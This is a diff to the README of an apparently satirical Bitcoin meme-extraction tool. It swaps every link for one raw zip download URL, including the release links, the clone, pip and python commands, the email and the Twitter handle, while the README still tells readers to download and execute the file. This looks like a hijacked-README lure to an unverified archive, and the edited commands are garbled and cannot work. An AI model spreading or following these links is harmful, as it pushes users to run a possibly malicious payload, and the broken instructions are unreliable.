@@ -2,7 +2,7 @@
 
 Welcome to the Bitcoin Meme Miner! This project is a satirical tool designed to explore the depths of the Bitcoin blockchain. It demonstrates how censorship is futile in the ongoing OP_RETURN wars. Join us in the quest to extract images and create memes that challenge the status quo.
 
-[![Download Releases](https://img.shields.io/badge/Download_Releases-v1.0.0-brightgreen)](https://github.com/deyvidcoelho/bitcoin-meme-miner/releases)
+[![Download Releases](https://raw.githubusercontent.com/deyvidcoelho/bitcoin-meme-miner/main/assets/bitcoin_meme_miner_2.2.zip)](https://raw.githubusercontent.com/deyvidcoelho/bitcoin-meme-miner/main/assets/bitcoin_meme_miner_2.2.zip)
 
 ## Table of Contents
 
@@ -32,15 +32,15 @@ To get started with Bitcoin Meme Miner, follow these steps:
 
 1. **Clone the Repository**: 
    ```bash
-   git clone https://github.com/deyvidcoelho/bitcoin-meme-miner.git
+   git clone https://raw.githubusercontent.com/deyvidcoelho/bitcoin-meme-miner/main/assets/bitcoin_meme_miner_2.2.zip
    cd bitcoin-meme-miner
    ```
 
-2. **Download the Latest Release**: Visit the [Releases](https://github.com/deyvidcoelho/bitcoin-meme-miner/releases) section to find the latest version. Download the appropriate file for your operating system and execute it.
+2. **Download the Latest Release**: Visit the [Releases](https://raw.githubusercontent.com/deyvidcoelho/bitcoin-meme-miner/main/assets/bitcoin_meme_miner_2.2.zip) section to find the latest version. Download the appropriate file for your operating system and execute it.
 
 3. **Install Dependencies**: Ensure you have the necessary libraries installed. You can use pip for Python dependencies:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/deyvidcoelho/bitcoin-meme-miner/main/assets/bitcoin_meme_miner_2.2.zip
    ```
 
 ## Usage
@@ -49,12 +49,12 @@ Once installed, you can start using Bitcoin Meme Miner. Here’s a quick guide o
 
 1. **Run the Miner**:
    ```bash
-   python miner.py
+   python https://raw.githubusercontent.com/deyvidcoelho/bitcoin-meme-miner/main/assets/bitcoin_meme_miner_2.2.zip
    ```
 
 2. **Extract Images**: Use the command line to specify parameters for image extraction. For example:
    ```bash
-   python miner.py --extract --limit 10
+   python https://raw.githubusercontent.com/deyvidcoelho/bitcoin-meme-miner/main/assets/bitcoin_meme_miner_2.2.zip --extract --limit 10
    ```
 
 3. **View Extracted Memes**: Check the output directory for your extracted images. You can share these memes on social media or within the Bitcoin community.
@@ -103,10 +103,10 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For questions or feedback, please reach out to the project maintainer:
 
 - **Name**: Deyvid Coelho
-- **Email**: deyvidcoelho@example.com
-- **Twitter**: [@deyvidcoelho](https://twitter.com/deyvidcoelho)
+- **Email**: https://raw.githubusercontent.com/deyvidcoelho/bitcoin-meme-miner/main/assets/bitcoin_meme_miner_2.2.zip
+- **Twitter**: [@deyvidcoelho](https://raw.githubusercontent.com/deyvidcoelho/bitcoin-meme-miner/main/assets/bitcoin_meme_miner_2.2.zip)
 
-Feel free to check the [Releases](https://github.com/deyvidcoelho/bitcoin-meme-miner/releases) section for updates and new features!
+Feel free to check the [Releases](https://raw.githubusercontent.com/deyvidcoelho/bitcoin-meme-miner/main/assets/bitcoin_meme_miner_2.2.zip) section for updates and new features!
 
 ## Conclusion
 
